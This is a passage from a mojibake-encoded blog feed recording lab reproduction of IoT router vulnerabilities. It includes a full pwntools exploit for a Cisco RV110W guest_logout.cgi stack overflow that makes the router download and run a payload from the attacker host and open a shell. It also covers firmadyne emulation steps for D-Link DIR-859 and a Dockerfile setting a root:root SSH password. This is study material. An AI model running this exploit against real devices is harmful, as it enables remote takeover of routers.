alt="image-20240626235453453"></p><p>æ–­å¼€åæœåŠ¡ä¼šdownï¼Œéœ€è¦é‡æ–°upæ‰èƒ½èµ·æ¥</p><p>è°ƒè¯•é…ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271159313.png" alt="image-20240627115953109"></p><h3 id="å°æ’æ›²"><a href="#å°æ’æ›²" class="headerlink" title="å°æ’æ›²"></a>å°æ’æ›²</h3><p>å†…ç½®çš„gefæ’ä»¶æ— æ³•æ­£å¸¸åŠ è½½â€“åŸå› ä¸ºgdbä¸pythonç‰ˆæœ¬è¾ƒä½</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270002901.png" alt="image-20240627000252848"></p><p>å®˜æ–¹æ‰‹å†Œ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png" alt="image-20240627000444482"></p><p>è¦æ±‚GDB 8.0ä»¥ä¸Šï¼ŒPython3.6+ï¼Œä¿®æ”¹æ›´éº»çƒ¦äº†ï¼Œå¹²è„†ä¸è£…gefäº†ï¼ŒæŠŠgefé‚£è¡Œæ³¨é‡Šæ‰</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                </span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;firmianay@gmail.com&quot;</span>                                                                                                       </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span></span><br><span class="line">    &amp;&amp; apt-get install -y qemu-system-mipsel \                                                                                           </span><br><span class="line">    &amp;&amp; apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                      </span><br><span class="line">    &amp;&amp; sed -i <span class="string">&quot;s/PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; echo <span class="string">&quot;root:root&quot;</span> | chpasswd &amp;&amp; echo <span class="string">&quot;GatewayPorts yes&quot;</span> &gt;&gt;  /etc/ssh/sshd_config \                                                                                               </span><br><span class="line">   <span class="comment"># &amp;&amp; git clone --depth=1 https://github.com/hugsy/gef.git \   </span></span><br><span class="line">    &amp;&amp; git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \</span><br><span class="line">   <span class="comment"># &amp;&amp; cp gef/gef.py ~/.gef.py &amp;&amp; echo &quot;source ~/.gef.py&quot; &gt; ~/.gdbinit &amp;&amp; echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrc \    </span></span><br><span class="line">    &amp;&amp; echo <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit &amp;&amp; echo <span class="string">&quot;export LC_CTYPE=C.UTF-8&quot;</span> &gt;&gt; ~/.bashrc \ </span><br><span class="line">    &amp;&amp; python3 -m pip install --upgrade pwntools \                                                                                       </span><br><span class="line">    &amp;&amp; apt-get purge -y --autoremove git \                                                                                               </span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* /root/gef                                                                                             </span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="comment">#RUN mkdir images &amp;&amp; cd images \                                                                                                         </span></span><br><span class="line"><span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span></span><br><span class="line"><span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æœ¬æ¼æ´å­˜åœ¨äºCISCO RV110W-E-CN-K9ï¼ˆå›ºä»¶ç‰ˆæœ¬1.2.2.5ï¼‰ï¼Œæ¼æ´åŸå› æ˜¯cgiæ¥å£guest_logout.cgiä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè€Œå› ä¸ºmipsæœ¬èº«ä¸æ”¯æŒNXä»è€Œå¯¼è‡´å¯ä»¥ä½¿ç”¨shellcodeå¾—åˆ°shell </p><p>æ¼æ´ç‚¹ sscanfå‡½æ•°é€šè¿‡æ”¿ç­–è¡¨è¾¾å¼å°†v11è¾“å…¥v29å’Œv28ä¸­  å…¶ä¸­v29å­˜å‚¨çš„æ˜¯åˆ†å·å‰çš„æ‰€æœ‰å­—ç¬¦ï¼Œè€Œv28å­˜å‚¨çš„æ˜¯ä¸åœ¨åˆ†å·åå’Œç­‰å·å‰ä½†åœ¨ç­‰å·åæ¢è¡Œç¬¦å‰çš„æ‰€æœ‰å­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271205845.png" alt="image-20240627120518766"></p><p>ç„¶åè·Ÿè¸ªv11</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png" alt="image-20240627120718622"></p><p>exp:</p><p>msfç”Ÿæˆçš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0047A610</span></span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;/msf\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">0x55</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) </span><br><span class="line">data = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>, <span class="string">&quot;submit_button&quot;</span>:payload, <span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.100.1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(<span class="string">&quot;http://192.168.2.2/guest_logout.cgi&quot;</span>, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">thread = Thread(target=attack)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">31337</span>)</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">thread.join()</span><br></pre></td></tr></table></figure><h1 id="D-Link-DIR-859-å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-17621ï¼‰"><a href="#D-Link-DIR-859-å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-17621ï¼‰" class="headerlink" title="D-Link DIR-859 å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-17621ï¼‰"></a>D-Link DIR-859 å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-17621ï¼‰<a id="DLINK"></a></h1><h2 id="æ¼æ´ç¯å¢ƒ-4"><a href="#æ¼æ´ç¯å¢ƒ-4" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h2><ul><li>dockerï¼šæ”»å‡»ã€è°ƒè¯•ä¸»æœºï¼š192.168.2.1</li><li>firmadyneï¼šå›ºä»¶ä¸»æœºï¼š192.168.0.1</li><li>htdocs&#x2F;cgibinï¼ˆæœ‰æ¼æ´çš„æœåŠ¡ç¨‹åºï¼‰ï¼š192.168.0.1:49152</li><li>é•œåƒä¾èµ–ï¼š<code>firmianay/ubuntu1604 -&gt; firmianay/binwalk:noentry -&gt; firmianay/firmadyneï¼ˆæˆ–è€… firmianay/firmaeï¼‰</code></li></ul><h2 id="ç¯å¢ƒæ­å»º-4"><a href="#ç¯å¢ƒæ­å»º-4" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç¼ºå°‘çš„é•œåƒéœ€è¦åˆ°å¯¹åº”baseimageç›®å½•ä¸‹é¢æ„å»º</p><blockquote><p>docker run â€“rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer â€œ&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.binâ€</p><p>docker-compose -f docker-compose-firmadyne.yml build   #docker-compose -f docker-compose-firmae.yml build</p><p>docker-compose -f docker-compose-firmadyne.yml up       #docker-compose -f docker-compose-firmae.yml up</p></blockquote><p>ä¸¤ç§æ–¹æ³•éƒ½å°è¯•äº†ï¼Œdockeréƒ½æ²¡èµ·æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271926418.png" alt="image-20240627192536273"></p><h2 id="æœ¬åœ°ç¯å¢ƒæ­å»º"><a href="#æœ¬åœ°ç¯å¢ƒæ­å»º" class="headerlink" title="æœ¬åœ°ç¯å¢ƒæ­å»º"></a>æœ¬åœ°ç¯å¢ƒæ­å»º<a id="LOCAL"></a></h2><p><a href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCEæ¼æ´ï¼ˆCVE-2019-17621ï¼‰åˆ†æå¤ç° (qq.com)</a></p><p><a href="https://www.cnblogs.com/VxerLee/p/16427304.html">é›¶åŸºç¡€å­¦IoT Pwn</a></p><p>æœ¬åœ°ubuntu22.04è™šæ‹Ÿæœºæ­å»ºIOTç¯å¢ƒ</p><h3 id="binwalkå›ºä»¶è§£åŒ…å·¥å…·"><a href="#binwalkå›ºä»¶è§£åŒ…å·¥å…·" class="headerlink" title="binwalkå›ºä»¶è§£åŒ…å·¥å…·"></a>binwalkå›ºä»¶è§£åŒ…å·¥å…·<a id="binwalk"></a></h3><p><a href="https://github.com/ReFirmLabs/binwalk">ReFirmLabs&#x2F;binwalk: Firmware Analysis Tool (github.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ä¾èµ–é¡¹åŒ…å«åœ¨deps.shä¸­</span></span><br><span class="line">./.deps.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ä¸€äº›ä¾èµ–å·¥å…·</span></span><br><span class="line">sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"></span><br><span class="line">sudo python3 setup.py install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å¸è½½</span></span><br><span class="line">sudo python3 setup.py uninstall</span><br></pre></td></tr></table></figure><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu<a id="qemu"></a></h3><p>æ²¡æœ‰æœ¬åœ°ç¼–è¯‘ï¼Œç›´æ¥ç”¨å®˜æ–¹çš„å‘½ä»¤è¡Œå®‰è£…</p><p><a href="https://www.qemu.org/download/#linux">Download QEMU - QEMU</a></p><p>Debian&#x2F;Ubuntu:</p><ul><li>For full system emulation: <code>apt-get install qemu-system</code></li><li>For emulating Linux binaries: <code>apt-get install qemu-user-static</code></li></ul><h3 id="Firmadyne-å›ºä»¶ä»¿çœŸå·¥å…·"><a href="#Firmadyne-å›ºä»¶ä»¿çœŸå·¥å…·" class="headerlink" title="Firmadyne å›ºä»¶ä»¿çœŸå·¥å…·"></a>Firmadyne å›ºä»¶ä»¿çœŸå·¥å…·<a id="firmadyne"></a></h3><p><a href="https://github.com/firmadyne/firmadyne#introduction">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git    #å…‹éš†é¡¹ç›®ä»¥åŠå­é¡¹ç›®</span><br></pre></td></tr></table></figure><p>å®‰è£…postgresqlæ•°æ®åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install postgresql</span><br><span class="line">sudo -u postgres createuser -P firmadyne  #å¯†ç è®¾ç½®ä¸ºfirmadyne</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ•°æ®åº“æ˜¯å¦é…ç½®å®Œæˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql -d firmware   #è¿æ¥åˆ°æ•°æ®åº“</span><br><span class="line">\dt                       #åˆ—å‡ºæ‰€æœ‰è¡¨</span><br><span class="line">\d table_name                 #æŸ¥çœ‹è¡¨ç»“æ„</span><br><span class="line">SELECT * FROM table_name;        #æŸ¥çœ‹è¡¨ä¸­æ•°æ®</span><br><span class="line">\q                       #é€€å‡º</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913673.png" alt="image-20240717091308539"></p><p>ä¸‹è½½éœ€è¦çš„äºŒè¿›åˆ¶å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download.sh</span><br><span class="line">ls ./binaries/   #æ£€æŸ¥å®‰è£…å®Œæˆ</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913451.png" alt="image-20240717091350377"></p><h3 id="æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶"><a href="#æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶" class="headerlink" title="æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶"></a>æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶<a id="action"></a></h3><p>æ¸…ç†ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">./reset.py</span><br></pre></td></tr></table></figure><p>æå–å›ºä»¶åŒ…å¹¶ä¿å­˜é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk DIR822A1_FW103WWb03.bin  images</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-b  æŒ‡å®šå›ºä»¶æ‰€å±å“ç‰Œ</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sql è¿æ¥æœ¬åœ°æ•°æ®åº“</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-np ä¸ä½¿ç”¨å¹¶è¡Œæ¨¡å¼ï¼Œè¿™ä¸ªå‚æ•°å‘Šè¯‰è„šæœ¬ä¸ä½¿ç”¨å¹¶è¡Œå¤„ç†ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•æˆ–åœ¨èµ„æºæœ‰é™çš„ç³»ç»Ÿä¸Šè¿è¡Œæ—¶ä½¿ç”¨</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-nk ä¸ä¿ç•™æå–çš„å›ºä»¶é•œåƒ</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170935339.png" alt="image-20240717093500277"></p><p>è¯†åˆ«CPUæ¶æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/2.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170936295.png" alt="image-20240717093612247"></p><p>åˆ›å»ºé•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/makeImage.sh id</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171034660.png" alt="image-20240717103423529"></p><p>å­˜å‚¨æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./scripts/tar2db.py -i id -f ./images/3.tar.gz</span><br><span class="line"></span><br><span class="line">#æ•°æ®åº“æŸ¥çœ‹</span><br><span class="line">sudo -u postgres psql -d firmware </span><br><span class="line">SELECT * FROM image WHERE id = 3;</span><br></pre></td></tr></table></figure><p>è®¾ç½®ç½‘ç»œæ¥å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/inferNetwork.sh id</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171033321.png" alt="image-20240717103310256"></p><p>ç„¶åæœ¬åœ°ä¼šç”Ÿæˆä¸€ä¸ªåŒç½‘æ®µçš„ç½‘å¡</p><p>è¿è¡Œå›ºä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scratch/id/run.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171040100.png" alt="image-20240717104031046"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171039126.png" alt="image-20240717103956988"></p><p>sshç«¯å£è½¬å‘</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/121956966">æµé‡è½¬å‘ä¹‹ç«¯å£è½¬å‘-CSDNåšå®¢</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171111502.png" alt="å±å¹•æˆªå›¾ 2024-07-17 110805"></p><p>è°ƒè¯•ç¯å¢ƒçš„æ­å»ºå…ˆæç€</p><p>ç”¨iot-vulhubé‡Œé¢æä¾›çš„expæ‰“é€š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171118223.png" alt="image-20240717111850093"></p><p>æœåŠ¡å…³é—­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnp  #æŸ¥çœ‹qemuæœåŠ¡PID</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿå›ºä»¶è¿‡ç¨‹ä¸­ä½¿ç”¨æ•°æ®åº“æ¥è®°å½•å’Œç»Ÿè®¡å›ºä»¶ä¿¡æ¯ï¼Œæœ‰æ—¶è¿™ä¸€è¡Œä¸ºæ˜¯æ— ç”¨åŠŸï¼Œ<a href="https://wzt.ac.cn/2021/08/15/firmadyne3/">å›ºä»¶æ¨¡æ‹Ÿ Case Study (3) | CataLpaâ€™s Site (wzt.ac.cn)</a>è¿™ä½å¸ˆå‚…æ˜¯å°†firmadyneä¸­å†™å…¥æ•°æ®åº“çš„ä»£ç è¿›è¡Œäº†åˆ æ”¹</p><p>FATé¡¹ç›®åŸºäºFirmadyneè¿›è¡Œäº†æ›´æ”¹ï¼Œä¸ä½¿ç”¨PostgreSQLæ•°æ®åº“å­˜å‚¨è®¾å¤‡ä¿¡æ¯ã€‚</p><p>ä¸‹è½½ Firmware Analysis Toolkit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/attify/firmware-analysis-toolkit.git</span><br></pre></td></tr></table></figure><p>æ”¹fat.configæ–‡ä»¶ä¸­çš„é…ç½®ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">sudo_password=Your_Root_pwd</span><br><span class="line">firmadyne_path=Your_firmadyne_Path</span><br></pre></td></tr></table></figure><p>è®¾ç½®çš„ç½‘ç»œæ¥å£ä¸ºç©ºï¼Œè™½ç„¶è·‘èµ·æ¥äº†ï¼Œä½†æ˜¯ifconfigæ²¡æœ‰ç½‘å¡ä¿¡æ¯ï¼ŒæœåŠ¡æ²¡èµ·èµ·æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171324298.png" alt="image-20240717132423058"></p><p>inferNetwork.shæ²¡æœ‰æ‰¾åˆ°ä»»ä½•ç½‘ç»œæ¥å£ï¼Œä½œè€…æœ‰åœ¨è®ºæ–‡ä¸­æåˆ°<a href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf">firmadyne&#x2F;paper&#x2F;paper.pdf at master Â· firmadyne&#x2F;firmadyne (github.com)</a> </p><blockquote><p>ä¸€ä¸ªä»¤äººä¸ä¾¿çš„äº‹å®æ˜¯ï¼Œæé«˜ä»¿çœŸæˆåŠŸç‡æˆ–ä¿®å¤å›ºä»¶æ˜ åƒçš„ç½‘ç»œé…ç½®æ£€æµ‹ï¼Œä¾‹å¦‚ Shibby çš„ Tomatoï¼Œæ˜¯ä¸€ä¸ªæ‰‹åŠ¨è¿‡ç¨‹ã€‚</p><p>å®ƒè¦æ±‚åˆ†æäººå‘˜æ‰‹åŠ¨æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—ï¼Œä»¥ä¾¿æ ¹æ®æ ¹æœ¬åŸå› è¯†åˆ«å’Œåˆ†ç±»ä»¿çœŸå¤±è´¥ï¼Œç„¶åè¿›è¡Œå¿…è¦çš„æ›´æ”¹ä»¥æ”¯æŒè¿™äº›æ˜ åƒã€‚</p><p>é€šå¸¸ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªå¾ªç¯è¿‡ç¨‹ï¼Œå› ä¸ºä»¿çœŸå¤±è´¥å¯èƒ½æœ‰å¤šç§åŸå› ã€‚</p></blockquote><p>firmware-analysis-toolkitçš„ä½œè€…æœ‰åœ¨<a href="https://github.com/attify/firmware-analysis-toolkit/issues/46">issuse46</a>é‡Œæä¾›äº†ä¸€ä¸ªæ–¹æ³•ï¼Œå°†inferNetwork.shè¶…æ—¶å€¼å¢åŠ </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171410301.png" alt="image-20240717141057141"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><a href="https://mp.weixin.qq.com/s/TzFepaBpYnMbZ8Mep4IXwA">D-Link DIR-859 RCEæ¼æ´ï¼ˆCVE-2019-17621ï¼‰åˆ†æå¤ç° (qq.com)</a></p><p><a href="https://www.cnblogs.com/m00nflower/p/15933470.html">CVE-2019-17621 Dlink-859 RCE å¤ç° - moon_flower - åšå®¢å›­ (cnblogs.com)</a></p><p>ä¸»è¦æ¼æ´åˆ©ç”¨åœ¨ï¼šåˆ©ç”¨fwriteå‡½æ•°æ§åˆ¶$shell_fileçš„å€¼ï¼Œå¦‚æœå‘$shell_fileä¸­å†™å…¥äº†ç”±åå¼•å·åŒ…è£¹çš„å‘½ä»¤ï¼Œå°±èƒ½RCEç»•è¿‡ã€‚</p><p>cigbinç¨‹åºä¸­çš„è°ƒç”¨æµç¨‹ï¼šbuf_8 -&gt;xmldbc_ephp-&gt;FUN_0041420c -&gt;FUN_0041372c -&gt; socket</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272301792.png" alt="image-20240627230116665"></p><p>è°ƒç”¨äº†GENA_subscribe_new()ï¼Œå®šä¹‰åœ¨gena.phpæ–‡ä»¶ä¸­  htdocs&#x2F;upnpincä¸‹</p><p>è¿™é‡Œä¹Ÿå°±æ˜¯æ¼æ´æ‰€åœ¨ã€‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272304282.png" alt="image-20240627230435176"></p><p>ä»è¿™å¼€å§‹ï¼Œç¯å¢ƒçš„æ„å»ºå°†ä¸ä¾èµ–äºdokcerç¯å¢ƒï¼Œè€Œæ˜¯é€šè¿‡æœ¬åœ°æ¥æ¨¡æ‹Ÿç¯å¢ƒã€‚</p><hr><p>ingã€‚ã€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å€Ÿç€é€†å‘è¯¾çš„ä½œä¸šï¼Œå°±å€Ÿæ­¤æœºä¼šæ¥ç®€å•å­¦ä¹ å¹¶å¤ç°iotå›ºä»¶æ¼æ´ã€‚ç½‘ä¸Šæœé›†èµ„æ–™æ‰¾åˆ°äº†&lt;a href=&quot;https://github.com/Vu1nT0tal/IoT-vulhub&quot;&gt;Vu1nT0tal&amp;#x2F;IoT-vulhub: IoTå›ºä»¶æ¼æ´å¤ç°ç¯å¢ƒ (github.c</summary>
      
    
    
    
    <category term="IOT" scheme="http://tw11ty.github.io/categories/IOT/"/>
    
    
    <category term="IOT" scheme="http://tw11ty.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscnåˆ†åŒºèµ›-pwnå¤ç°</title>
    <link href="http://tw11ty.github.io/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://tw11ty.github.io/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-06-25T10:23:13.000Z</published>
    <updated>2024-11-16T09:11:37.459Z</updated>
    
